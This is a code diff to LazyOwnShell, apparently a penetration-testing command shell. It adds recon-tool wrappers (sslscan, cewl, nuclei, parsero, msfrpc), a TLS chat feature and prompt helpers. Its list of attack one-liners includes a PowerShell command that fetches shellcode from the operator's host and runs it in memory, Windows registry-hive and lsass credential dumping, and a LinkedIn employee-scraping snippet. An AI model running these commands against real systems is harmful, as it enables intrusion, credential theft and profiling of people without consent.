@@ -181,6 +181,8 @@ class LazyOwnShell(Cmd):
         ]
         self.output = ""
         self.custom_prompt = getprompt()
+        self.socket = None
+        self.running = False
 
     def default(self, line):
         """
@@ -4140,6 +4142,64 @@ class LazyOwnShell(Cmd):
             print_msg(f"Updated lhost to {clipboard_ip}")        
         return
 
+
+    def do_ipp(self, line):
+        """
+        Displays IP addresses of network interfaces and prints the IP address from the `tun0` interface.
+
+        This function performs the following tasks:
+        1. Displays IP addresses for all network interfaces using `ip a show scope global` and `awk`.
+        2. Prints the IP address from the `tun0` interface.
+
+        Usage:
+            ip
+
+        :param line: This parameter is not used in the function but is included for consistency with other command methods.
+        :type line: str
+        :returns: None
+
+        Manual execution:
+        1. The command `ip a show scope global | awk '/^[0-9]+:/ { sub(/:/,"",$2); iface=$2 } /^[[:space:]]*inet / { split($2, a, "/"); print "    [\033[96m" iface"\033[0m] "a[1] }'` is executed to display the IP addresses of all network interfaces.
+        2. The IP address of the `tun0` interface is printed to the console using the command `ip a show tun0 | grep 'inet ' | awk '{print $2}' | cut -d'/' -f1`.
+
+        Dependencies:
+        - The function relies on `awk`, `grep`, `cut`, and `xclip` to process and display the IP address.
+
+        Example:
+            ip
+            # This will display IP addresses for all network interfaces and print the IP address from `tun0`.
+
+        Note:
+            Ensure that the `tun0` interface exists and has an IP address assigned. If `tun0` is not present or has no IP address, the address will not be displayed.
+        """
+
+        # Display IP addresses for all network interfaces
+        os.system(
+            'ip a show scope global | awk \'/^[0-9]+:/ { sub(/:/,"",$2); iface=$2 } /^[[:space:]]*inet / { split($2, a, "/"); print "    [\033[96m" iface"\033[0m] "a[1] }\''
+        )
+
+        # Print the IP address of the `tun0` interface
+        try:
+            ip_address = subprocess.check_output(
+                "ip a show tun0 | grep 'inet ' | awk '{print $2}' | cut -d'/' -f1",
+                shell=True
+            ).decode().strip()
+            
+        
+        except subprocess.CalledProcessError:
+            print_error("Error retrieving IP address from tun0.")
+        
+        # Optionally update lhost
+        lhost = self.params['lhost']
+        if ip_address and ip_address != lhost:
+            lhost = ip_address
+            # Example of how you might set the new lhost
+            self.params['lhost'] = lhost
+            self.prompt = f"Updated lhost to {lhost}"
+            print_msg(f"Updated lhost to {lhost}")
+
+        return
+
     def do_rhost(self, line):
         """
         Copies the remote host (rhost) to the clipboard and updates the command prompt.
@@ -4193,6 +4253,61 @@ class LazyOwnShell(Cmd):
             self.prompt = f"{self.custom_prompt}"
             os.system(f"printf '{rhost}' | xclip -sel clip")
             print_msg(f"ip from payload: {rhost=}, copied to clipboard :) {RESET}")
+        return
+
+
+    def do_rrhost(self, line):
+        """
+        Updates the command prompt to include the remote host (rhost) and current working directory.
+
+        This function performs two tasks:
+        1. It updates the command prompt to include the `rhost` and the current working directory if `line` is not 'clean'.
+        2. It resets the command prompt to its default format if `line` is 'clean'.
+
+        Usage:
+            rhost [clean]
+
+        :param line: An optional argument that determines the behavior of the function:
+            - If 'clean', it resets the command prompt to its default format.
+            - If any other value, it updates the command prompt to include the `rhost` and current working directory.
+        :type line: str
+        :returns: None
+
+        Manual execution:
+        1. If `line` is 'clean':
+        - The command prompt is reset to its default format.
+        2. If `line` is any other value:
+        - The command prompt is updated to show the `rhost` and the current working directory.
+
+        Example:
+            rhost
+            # This will update the command prompt to include the `rhost` and current working directory.
+            
+            rhost clean
+            # This will reset the command prompt to its default format.
+
+        Note:
+            Ensure that the `rhost` is valid by checking it with the `check_rhost` function before updating the prompt.
+        """
+        url = self.params['url']
+        rhost = self.params["rhost"]
+        
+        if not check_rhost(rhost):
+            return
+        
+        if not url:
+            print_error("URL must be set, use: set url http://host.ext")
+            return
+        
+        cwd = os.getcwd()
+        
+        if line == 'clean':
+            self.custom_prompt = getprompt()
+            self.prompt = f"{self.custom_prompt}"
+        else:
+            self.custom_prompt = getprompt().replace(']', f" ~{GREEN}{cwd}{YELLOW}]{YELLOW}[{MAGENTA}{rhost}{YELLOW}][{BLUE}{url}{YELLOW}]")
+            self.prompt = f"{self.custom_prompt}"
+            print_msg(f"Updated prompt with rhost: {rhost} and current directory.")
         return
 
     def do_banner(self, line):
@@ -4628,7 +4743,8 @@ class LazyOwnShell(Cmd):
             ("WIN copy sam2", "reg.exe save hklm\system C:\system.save"),
             ("WIN copy sam3", "reg.exe save hklm\security C:\security.save"),
             ("WIN get lsass", 'Get-Process lsass (obtener el PID del proceso lsass) \r\n rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full'),
-            ("WIN Execute shellcode",f'powershell -Command "$url=\'http://{lhost}/shellcode.bin\'; $shellcodeBase64=(Invoke-RestMethod -Uri $url -Method Get); $shellcode=[System.Convert]::FromBase64String($shellcodeBase64); $shellcodeBuffer=[System.Runtime.InteropServices.Marshal]::AllocHGlobal($shellcode.Length); [System.Runtime.InteropServices.Marshal]::Copy($shellcode, 0, $shellcodeBuffer, $shellcode.Length); $functionDelegate=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($shellcodeBuffer, [System.Action]); $functionDelegate.Invoke(); [System.Runtime.InteropServices.Marshal]::FreeHGlobal($shellcodeBuffer)"')
+            ("WIN Execute shellcode",f'powershell -Command "$url=\'http://{lhost}/shellcode.bin\'; $shellcodeBase64=(Invoke-RestMethod -Uri $url -Method Get); $shellcode=[System.Convert]::FromBase64String($shellcodeBase64); $shellcodeBuffer=[System.Runtime.InteropServices.Marshal]::AllocHGlobal($shellcode.Length); [System.Runtime.InteropServices.Marshal]::Copy($shellcode, 0, $shellcodeBuffer, $shellcode.Length); $functionDelegate=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($shellcodeBuffer, [System.Action]); $functionDelegate.Invoke(); [System.Runtime.InteropServices.Marshal]::FreeHGlobal($shellcodeBuffer)"'),
+            ("WEB linkedin.com workers scrapper", 'var employees = []; employees = employees.concat(document.getElementsByTagName("h3")); for(var i=0;i<employees[0].length;i++){ 	console.log(employees[0][i].innerHTML) }')
         ]
         
         for idx, (alias, cmd) in enumerate(commands_list):
@@ -6389,7 +6505,9 @@ class LazyOwnShell(Cmd):
             'download_resources.sh',
             'win',
             'lin',
-            'users.txt'
+            'php',
+            'users.txt',
+            'sslscan-singleip.sh'
         ]
 
         # Path to the sessions directory
@@ -8511,6 +8629,7 @@ class LazyOwnShell(Cmd):
         
         command = f"crunch {line} {line} {pattern} -o sessions/dict_{line}.txt"
         os.system(command)
+
         return
 
     def do_malwarebazar(self, line):
@@ -8587,6 +8706,358 @@ class LazyOwnShell(Cmd):
         print_msg(out)
         return
 
+
+    def do_sslscan(self, line):
+        """
+        Run an SSL scan on the specified remote host.
+
+        This function initiates an SSL scan on a specified remote host (`rhost`)
+        using the `sslscan-singleip.sh` script. If a specific port is provided in the
+        `line` argument, the scan will target that port; otherwise, it will scan
+        all available ports.
+
+        Parameters:
+        line (str): The port number to scan (optional). If omitted, the scan will target all ports.
+
+        Internal Variables:
+        rhost (str): The remote host IP address or hostname extracted from the `params` attribute.
+
+        Returns:
+        None
+
+        Example Usage:
+        - To scan all ports on the specified `rhost`: `sslscan`
+        - To scan a specific port (e.g., port 443) on `rhost`: `sslscan 443`
+
+        Note:
+        - The `check_rhost()` function is used to validate the `rhost` before running the scan.
+        - The `sslscan-singleip.sh` script must be present in the `sessions` directory.
+        """
+        rhost = self.params["rhost"]
+        if not check_rhost(rhost):
+            return
+
+        if not line:
+            port = ""
+        else:
+            port = ":"+line
+
+        command = f"cd sessions && ./sslscan-singleip.sh {rhost}{port}"
+        print_msg(f"Attempting to execute: {command}")
+        os.system(command)
+        return
+
+    def do_cewl(self, line):
+        """
+        This function constructs and executes a command for the 'cewl' tool.
+        It first checks if the 'url' parameter is set. If not, it prints an error message.
+        If the 'url' is set, it extracts the domain from the URL using the get_domain function.
+        Then, it constructs a 'cewl' command with the specified parameters and prepares it for execution.
+        
+        Scan to a depth of 2 (-d 2) and use a minimum word length of 5 (-m 5), save the words to a file (-w docswords.txt), targeting the given URL (https://example.com):
+        
+        Parameters:
+        line (str): The command line input for this function.
+
+        Expected self.params keys:
+        - url (str): The URL to be used for the 'cewl' command.
+
+        Example usage:
+        - set url http://example.com
+        - do_cewl
+        """        
+        extra = ""
+        url = self.params["url"]
+        if not url:
+            print_error(f"Url must be set use{GREEN} set url http://example.com")
+            return
+        domain = get_domain(url)
+        file = "sessions/credentials.txt"
+        if os.path.exists(file):
+            with open(file, "r") as f:
+                for file_line in f:
+                    params = file_line.split(":")
+                    user = params[0]
+                    passwd = params[1].replace("\n", "")
+                    choice = input("    [!] Credentials found use Digest or basic (1 or 2) :")
+                    if choice == "1":
+                        auth_type = "Digest"
+                    else:
+                        auth_type = "basic"
+                    extra = f"--auth_type {auth_type} --auth_user {user} --auth_pass {passwd} "
+
+        command = f"cewl -d 2 -m 5 -w sessions/cewl_{domain}.txt {extra} -v {url}"
+        print_msg(command)
+        os.system(command)
+        return
+
+    def do_dmitry(self, line):
+        """
+        This function constructs and executes a command for the 'dmitry' tool.
+        It first checks if the 'url' parameter is set. If not, it prints an error message.
+        If the 'url' is set, it extracts the domain from the URL using the get_domain function.
+        Then, it constructs a 'dmitry' command with the specified parameters and prepares it for execution.
+        
+        Run a domain whois lookup (w), an IP whois lookup (i), retrieve Netcraft info (n), search for subdomains (s), search for email addresses (e), do a TCP port scan (p), and save the output to example.txt (o) for the domain example.com:
+        
+        Parameters:
+        line (str): The command line input for this function.
+
+        Expected self.params keys:
+        - url (str): The URL to be used for the 'dmitry' command.
+
+        Example usage:
+        - set url http://example.com
+        - do_dmitry
+        """        
+        if not is_binary_present("dmitry"):
+            print_warn("Installing dmitry...")
+            os.system("sudo apt install dmitry -y")
+
+        url = self.params["url"]
+        if not url:
+            print_error(f"Url must be set use{GREEN} set url http://example.com")
+            return
+        domain = get_domain(url)
+        
+        command = f"dmitry -winseo sessions/dmitry_{domain}.txt {domain}"
+        print_msg(command)
+        os.system(command)
+        return
+
+    def start_server(self):
+        """
+        Start the chat server that listens for incoming connections.
+        """
+        try:
+            port = int(self.params["lport"])
+            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+            self.socket.bind(('0.0.0.0', port))
+            self.socket.listen(1)
+            print_msg(f"Server started on port {port}. Waiting for connections...")
+
+            client_socket, address = self.socket.accept()
+            print_msg(f"Connection from {address} has been established.")
+
+            # Wrap the socket with SSL
+            context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
+            context.load_cert_chain(certfile="server.crt", keyfile="server.key")
+            self.socket = context.wrap_socket(client_socket, server_side=True)
+
+            self.running = True
+            self.handle_connection()
+        except KeyboardInterrupt:
+            print_warn("Exiting...")
+            
+        except Exception as e:
+            print_error(f"Server error: {e}")
+        finally:
+            self.running = False
+            if self.socket:
+                self.socket.close()
+                return
+
+    def start_client(self, ngrok_link):
+        """
+        Start the chat client and connect to the server via the ngrok link.
+        """
+        parsed_url = urlparse(ngrok_link)
+        host = parsed_url.hostname
+        port = parsed_url.port or 443
+
+        context = ssl.create_default_context()
+        context.check_hostname = False
+        context.verify_mode = ssl.CERT_NONE
+
+        try:
+            self.socket = socket.create_connection((host, port))
+            self.socket = context.wrap_socket(self.socket, server_hostname=host)
+            print_msg(f"Connected to server at {host}:{port}")
+
+            self.running = True
+            self.handle_connection()
+        except KeyboardInterrupt:
+            print_warn("Exiting...")
+        except Exception as e:
+            print_error(f"Client connection error: {e}")
+        finally:
+            self.running = False
+            if self.socket:
+                self.socket.close()
+                return
+
+    def handle_connection(self):
+        receive_thread = threading.Thread(target=self.receive_messages)
+        send_thread = threading.Thread(target=self.send_messages)
+
+        receive_thread.start()
+        send_thread.start()
+
+        receive_thread.join()
+        send_thread.join()
+
+    def receive_messages(self):
+        while self.running:
+            try:
+                message = self.socket.recv(1024).decode()
+                if not message:
+                    print_msg("Connection closed by the other side")
+                    self.running = False
+                    break
+                print_msg(f"Received: {message}")
+            except ssl.SSLError as e:
+                print_error(f"SSL error while receiving: {e}")
+            except Exception as e:
+                if self.running:
+                    print_error(f"Receive error: {e}")
+                self.running = False
+                break
+
+    def send_messages(self):
+        while self.running:
+            try:
+                message = input("    [!] You: ")
+                if not message:
+                    continue
+                if not self.running:
+                    break
+                self.socket.send(message.encode())
+                print_msg(f"Sent: {message}")
+            except ssl.SSLError as e:
+                print_error(f"SSL error while sending: {e}")
+            except Exception as e:
+                if self.running:
+                    print_error(f"Send error: {e}")
+                self.running = False
+                break
+
+    def do_chat(self, line):
+        """
+        Start chat server or client depending on the input.
+        """
+        if line:
+            self.start_client(line)
+        else:
+            self.start_server()
+
+    def do_graudit(self, line):
+        """
+        Executes the graudit command to perform a static code analysis with the specified options.
+
+        This function runs the 'graudit' tool with the '-A' option for an advanced scan and 
+        the '-i sessions' option to include session files. The results will be displayed 
+        directly in the terminal.
+
+        Args:
+            line (str): Input line from the command interface. This argument is currently 
+                        not used within the function but is required for the command 
+                        interface structure.
+                        
+        Example:
+            To run this function from the command interface, simply type 'graudit' and press enter.
+            The function will execute the 'graudit -A -i sessions' command.
+
+        Note:
+            Ensure that 'graudit' is installed and properly configured in your system's PATH 
+            for this function to work correctly.
+        """
+
+        if not is_binary_present("graudit"):
+            print_warn("Installing graudit...")
+            os.system("sudo apt install graudit -y")
+
+        command = "graudit -A -i sessions"
+        os.system(command)
+        return
+
+    def do_msfrpc(self, line):
+        """
+        Connects to the msfrpcd daemon and allows remote control of Metasploit.
+
+        Usage:
+            msfrpc -a <IP address> -p <port> -U <username> -P <password> [-S]
+
+        This command will prompt the user for necessary information to connect to msfrpcd.
+        """
+        # Prompt the user for connection details
+        ip_address = input("    [!] Enter the IP address to connect to (default: 127.0.0.1): ") or "127.0.0.1"
+        port = input("    [!] Enter the port to connect to (default: 55553): ") or "55553"
+        username = input("    [!] Enter the username: ")
+        password = input("    [!] Enter the password: ")
+        use_ssl = input("    [!] Disable SSL? (yes/no, default: no): ").strip().lower() == "yes"
+
+        # Construct the msfrpc command
+        cmd = ["msfrpc", "-a", ip_address, "-p", port, "-U", username, "-P", password]
+        if use_ssl:
+            cmd.append("-S")
+
+        # Run the command
+        try:
+            subprocess.run(cmd, check=True)
+        except subprocess.CalledProcessError as e:
+            print_error(f"Error connecting to msfrpcd: {e}") 
+
+    def do_nuclei(self, line):
+        """
+        Executes a Nuclei scan on a specified target URL or host.
+
+        Usage:
+            nuclei -u <URL> [-o <output file>] [other options]
+
+        If a URL is provided as an argument, it will be used as the target for the scan.
+        Otherwise, it will use the target specified in self.params["rhost"].
+        """
+        if not is_binary_present("nuclei"):
+            print_warn("Installing nuclei...")
+            os.system("sudo apt install nuclei -y")
+            
+        if line:
+            rhost = line
+        else:
+            rhost = self.params["rhost"]
+            if not check_rhost(rhost):
+                return
+        
+        output_file = f"sessions/{rhost}_nuclei_output.txt"
+        cmd = ["nuclei", "-u", rhost, "-o", output_file]
+        try:
+            subprocess.run(cmd, check=True)
+            os.system(f"cat {output_file}")
+        except subprocess.CalledProcessError as e:
+            print_error(f"Error running Nuclei scan: {e}")
+
+    def do_parsero(self, line):
+        """
+        Executes a parsero scan on a specified target URL or host.
+
+        Usage:
+            parsero -u <URL> [-o <output file>] [other options]
+
+        If a URL is provided as an argument, it will be used as the target for the scan.
+        Otherwise, it will use the target specified in self.params["rhost"].
+        """
+        if not is_binary_present("parsero"):
+            print_warn("Installing parsero...")
+            os.system("sudo apt install parsero -y")
+            
+        if line:
+            rhost = line
+        else:
+            rhost = self.params["rhost"]
+            if not check_rhost(rhost):
+                return
+        
+        output_file = f"sessions/{rhost}_parsero_output.txt"
+        cmd = ["parsero", "-u", rhost, "-sb"]
+        
+        try:
+            with open(output_file, 'w') as f:
+                subprocess.run(cmd, check=True, stdout=f, stderr=subprocess.STDOUT)
+            os.system(f"cat {output_file}")
+        except subprocess.CalledProcessError as e:
+            print_error(f"Error running parsero scan: {e}")
+
 if __name__ == "__main__":
     p = LazyOwnShell()
     p.onecmd("p")
@@ -8597,8 +9068,8 @@ if __name__ == "__main__":
                 os.system(
                     'ip a show scope global | awk \'/^[0-9]+:/ { sub(/:/,"",$2); iface=$2 } /^[[:space:]]*inet / { split($2, a, "/"); print "    [\033[96m" iface"\033[0m] "a[1] }\''
                 )
-                p.onecmd('ip')
-                p.onecmd("rhost")
+                p.onecmd('ipp')
+                p.onecmd("rrhost")
                 p.onecmd(cmd)
                 p.cmdloop()
             else:
@@ -8612,6 +9083,6 @@ if __name__ == "__main__":
     else:
         p.onecmd("rhost clean")    
 
-    p.onecmd('ip')
-    p.onecmd("rhost")
+    p.onecmd('ipp')
+    p.onecmd("rrhost")
     p.cmdloop()
